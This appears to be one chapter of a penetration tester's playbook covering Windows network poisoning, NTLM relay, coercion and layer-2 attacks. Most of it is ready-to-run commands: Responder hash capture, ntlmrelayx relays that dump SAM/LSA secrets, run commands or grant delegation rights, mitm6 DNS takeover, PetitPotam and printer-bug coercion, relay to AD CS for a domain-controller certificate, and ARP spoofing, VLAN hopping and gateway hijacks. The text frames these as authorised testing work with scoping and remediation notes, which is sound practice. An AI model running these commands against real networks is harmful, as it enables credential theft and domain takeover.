# 03 — Network Poisoning, MITM & NTLM Relay

**Goal:** with no creds yet, coerce Windows auth to you (Responder), or take over IPv6/DNS (mitm6),
then **crack** captured NetNTLM hashes or **relay** them to a host for a session / secrets dump.

## Responder — capture NetNTLMv2 (LLMNR / NBT-NS / mDNS poisoning)
```bash
responder -I <ATTACKER_INT> -A            # ANALYZE only (watch, don't answer) — safe recon first
responder -I <ATTACKER_INT>               # live poisoning
responder -I <ATTACKER_INT> -wF           # also serve WPAD + force auth (more captures, louder)
# Hashes → /usr/share/responder/logs/  → crack in 04:  hashcat -m 5600
```
> To **relay** instead of crack, turn Responder's SMB+HTTP servers OFF in `/etc/responder/Responder.conf`
> (`SMB = Off`, `HTTP = Off`) so ntlmrelayx can bind those ports.

## NTLM relay — turn coerced auth into access
Relay only lands on hosts with **SMB signing not enforced** (your `scans/no_signing.txt` from `02`).
```bash
# SMB→SMB, dump SAM/LSA where the coerced account is local admin
impacket-ntlmrelayx -tf scans/no_signing.txt -smb2support -of loot/relayed
# Keep sessions open as a SOCKS proxy and pivot tools through them
impacket-ntlmrelayx -tf scans/no_signing.txt -smb2support -socks
#   then: proxychains nxc smb <TARGET_IP> -u '<USER>' -p '' ...
# Run a command on relay
impacket-ntlmrelayx -tf scans/no_signing.txt -smb2support -c 'whoami'
# Relay to LDAP(S) for privilege abuse (see 09): RBCD or shadow credentials
impacket-ntlmrelayx -t ldaps://<DC_IP> --delegate-access -smb2support --remove-mic
impacket-ntlmrelayx -t ldaps://<DC_IP> --shadow-credentials -smb2support
```

## mitm6 — IPv6 DNS takeover (very effective on default AD)
```bash
mitm6 -d <DOMAIN>                          # become the network's IPv6 DNS
# pair with a relay to LDAP for the payoff:
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh wpad.<DOMAIN> -l loot/ --delegate-access
```
> mitm6 affects the whole segment — scope it, run short windows, coordinate so you don't disrupt others.

## Coercion — force a specific machine (often a DC) to authenticate to you
```bash
coercer coerce -u '<USER>' -p '<PASS>' -t <TARGET_IP> -l <ATTACKER_IP>   # tries many methods
impacket-petitpotam <ATTACKER_IP> <DC_IP>          # MS-EFSRPC (PetitPotam)
printerbug.py '<DOMAIN>/<USER>:<PASS>'@<DC_IP> <ATTACKER_IP>             # MS-RPRN (spooler)
dfscoerce.py -u '<USER>' -p '<PASS>' <ATTACKER_IP> <DC_IP>               # MS-DFSNM
```
Point the coerced auth at a waiting `ntlmrelayx` → LDAP (RBCD/shadow) or AD CS (ESC8, below).

## Relay to AD CS Web Enrollment (ESC8) — fast path to a DC/DA cert
```bash
impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# trigger with a coercion above → base64 cert → certipy auth (see 09) → TGT as that machine/DA
certipy relay -target 'http://<CA_IP>' -template DomainController        # certipy's built-in relay
```

## Layer 2 / 3 network attacks (switch, router & protocol abuse)
Internal drops often expose weak network-device config. These prove control-plane risk and can open
new segments. Loud and disruptive — analyze first, coordinate, and time-box.
```bash
# IPv6 / DHCPv6 takeover (see mitm6 above) — usually the highest-value L3 win in default AD
# ARP spoofing (MITM a specific pair; capture cleartext creds/tokens)
bettercap -iface <ATTACKER_INT> -eval "set arp.spoof.targets <TARGET_IP>; arp.spoof on; net.sniff on"
# LLMNR/NBT-NS/mDNS already covered by Responder (above)
# VLAN hopping — switch-spoofing (DTP) then tag into other VLANs
yersinia -G                                   # GUI: DTP/STP/CDP/HSRP/DHCP attacks
python3 frogger.py                            # VLAN enumeration/hopping helper
# CDP/LLDP recon — leaks device model, mgmt IP, native VLAN
tcpdump -nn -v -i <ATTACKER_INT> 'ether host 01:00:0c:cc:cc:cc'   # CDP frames
# HSRP/VRRP hijack — become the active gateway (default/clear-text or weak auth)
#   yersinia HSRP "become active" with higher priority (default 0/plaintext "cisco")
# STP root-bridge takeover (become root, reroute traffic)
#   yersinia STP "claiming root role"
# OSPF injection (weak/clear-text auth) — inject routes to redirect traffic
#   loki / yersinia OSPF module
# PXE boot image theft — pull the deployment image (often has creds/GPO/local admin)
#   set your host as DHCP/TFTP, or fetch the WIM and mount it offline
```
Findings here are usually **config weaknesses on the network gear**: DTP auto-trunking on, HSRP/VRRP
default or clear-text auth, no DHCP snooping / dynamic ARP inspection, STP without BPDU guard, CDP
enabled to access ports, IPv6 unmanaged. Each is a clean, remediable finding.

## Evidence to capture
- Screenshot the captured NetNTLMv2 (partially redacted) + source host/user.
- For relays: the `[+]` session, what was dumped, to which target.
- **Root cause** per finding: LLMNR/NBT-NS enabled, SMB signing not enforced, unmanaged IPv6, spooler/EFSRPC exposed.

## Pitfalls
- Relaying a hash **back to its origin host** is blocked (reflection) — relay to a *different* host.
- Crack **or** relay is an either/or on Responder's SMB/HTTP servers — configure accordingly.
- These are loud and affect real users — controlled windows, logged start/stop times.
